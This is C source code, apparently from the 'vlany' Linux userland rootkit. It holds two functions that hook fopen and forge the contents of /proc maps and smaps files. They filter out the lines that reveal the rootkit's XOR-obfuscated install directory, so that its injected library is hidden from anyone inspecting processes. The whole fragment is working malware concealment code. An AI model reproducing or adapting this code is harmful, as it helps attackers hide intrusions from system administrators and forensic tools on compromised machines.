FILE *forge_mem_maps(const char *path)
{
    #ifdef DEBUG
        printf("[vlany] forge_mem_maps() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    char buf[PATH_MAX];
    FILE *o = tmpfile(), *pnt = old_fopen(path, "r");

    if(pnt == NULL) { errno = ENOENT; return NULL; }

    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    while(fgets(buf, sizeof(buf), pnt) != NULL) if(!strstr(buf, install_dir)) fputs(buf, o);
    CLEAN(install_dir);

    fclose(pnt); fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_mem_smaps(const char *path)
{
    #ifdef DEBUG
        printf("[vlany] forge_mem_smaps() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    char buf[PATH_MAX]; int i = 0;
    FILE *o = tmpfile(), *pnt = old_fopen(path, "r");

    if(pnt == NULL) { errno = ENOENT; return NULL; }

    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(strstr(buf, install_dir)) i = 1;
        if(i == 0) fputs(buf, o);
    }
    CLEAN(install_dir);

    fclose(pnt); fseek(o, 0, SEEK_SET);
    return o;
}
